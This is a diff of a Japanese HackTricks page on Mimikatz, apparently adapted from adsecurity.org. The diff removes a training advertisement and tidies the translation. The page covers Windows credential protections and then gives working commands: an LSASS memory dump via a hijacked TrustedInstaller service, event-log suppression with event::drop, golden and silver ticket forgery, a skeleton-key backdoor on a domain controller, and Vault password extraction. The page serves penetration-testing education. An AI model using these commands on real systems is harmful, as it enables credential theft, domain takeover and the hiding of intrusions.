@@ -2,29 +2,23 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
+**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のものに基づいています**。詳細については元のページを確認してください！
 
-**モバイルセキュリティ**の専門知識を8kSec Academyで深めましょう。自己学習コースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
+## LM とメモリ内の平文
 
-{% embed url="https://academy.8ksec.io/" %}
+Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を防ぐための重要な対策が実施されています：
 
-**このページは[adsecurity.org](https://adsecurity.org/?page_id=1821)のものに基づいています**。詳細については元のページを確認してください！
+- **LM ハッシュと平文パスワード** はセキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。
 
-## メモリ内のLMおよび平文
+- **LSA 保護** は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることによって実現されます。LSA 保護の有効化には：
+1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ でレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
+2. このレジストリ変更を管理されたデバイス全体に強制するグループポリシーオブジェクト (GPO) を実装します。
 
-Windows 8.1およびWindows Server 2012 R2以降、資格情報の盗難を防ぐために重要な対策が実施されています：
+これらの保護にもかかわらず、Mimikatz のようなツールは特定のドライバーを使用して LSA 保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。
 
-- **LMハッシュと平文パスワード**は、セキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_をDWORD値`0`に設定してダイジェスト認証を無効にし、「平文」パスワードがLSASSにキャッシュされないようにする必要があります。
+### SeDebugPrivilege 削除への対抗
 
-- **LSA保護**は、ローカルセキュリティ機関（LSA）プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASSを保護されたプロセスとしてマークすることで実現されます。LSA保護を有効にするには：
-1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_のレジストリを変更し、`RunAsPPL`を`dword:00000001`に設定します。
-2. 管理されたデバイス全体でこのレジストリ変更を強制するグループポリシーオブジェクト（GPO）を実装します。
-
-これらの保護にもかかわらず、Mimikatzのようなツールは特定のドライバーを使用してLSA保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。
-
-### SeDebugPrivilegeの削除に対抗する
-
-管理者は通常SeDebugPrivilegeを持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstallerアカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行することができます：
+管理者は通常 SeDebugPrivilege を持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行することができます：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -47,7 +41,7 @@ Mimikatz におけるイベントログの改ざんは、主に二つのアク�
 #### 実験的機能：イベントサービスのパッチ適用
 
 - **コマンド**：`event::drop`
-- この実験的なコマンドは、イベントログサービスの動作を変更するように設計されており、新しいイベントの記録を効果的に防ぎます。
+- この実験的コマンドは、イベントログサービスの動作を変更するように設計されており、新しいイベントの記録を効果的に防ぎます。
 - 例：`mimikatz "privilege::debug" "event::drop" exit`
 
 - `privilege::debug` コマンドは、Mimikatz がシステムサービスを変更するために必要な特権で動作することを保証します。
@@ -57,7 +51,7 @@ Mimikatz におけるイベントログの改ざんは、主に二つのアク�
 
 ### ゴールデンチケットの作成
 
-ゴールデンチケットは、ドメイン全体のアクセスのなりすましを可能にします。主なコマンドとパラメータ：
+ゴールデンチケットは、ドメイン全体へのアクセスのなりすましを可能にします。主なコマンドとパラメータ：
 
 - コマンド：`kerberos::golden`
 - パラメータ：
@@ -76,12 +70,12 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 
 Silver Ticketsは特定のサービスへのアクセスを許可します。主なコマンドとパラメータ：
 
-- Command: Golden Ticketに似ていますが、特定のサービスをターゲットにします。
-- Parameters:
-- `/service`: ターゲットとするサービス（例：cifs、http）。
+- コマンド：Golden Ticketに似ていますが、特定のサービスをターゲットにします。
+- パラメータ：
+- `/service`：ターゲットとするサービス（例：cifs、http）。
 - その他のパラメータはGolden Ticketに似ています。
 
-Example:
+例：
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
@@ -158,7 +152,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### その他
 
-- **MISC::Skeleton**: DC上のLSASSにバックドアを注入します。
+- **MISC::Skeleton**: DCのLSASSにバックドアを注入します。
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### 権限昇格
@@ -203,10 +197,5 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Windows Vaultからパスワードを抽出します。
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**モバイルセキュリティ**の専門知識を深めるために、8kSecアカデミーで学びましょう。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
